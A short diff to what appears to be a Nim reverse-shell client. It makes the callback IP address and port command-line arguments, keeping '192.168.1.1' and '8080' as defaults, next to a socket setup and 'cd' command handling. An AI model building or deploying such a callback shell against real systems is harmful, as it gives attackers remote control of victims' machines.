@@ -12,8 +12,8 @@ var
   v = newSocket()
 
   # Change this
-  v1 = "192.168.1.1"
-  v2 = "8080"
+  v1 = if paramCount() >= 1: paramStr(1) else: "192.168.1.1"
+  v2 = if paramCount() >= 2: paramStr(2) else: "8080"
 
   s4 = "Exiting.."
   s5 = "cd"
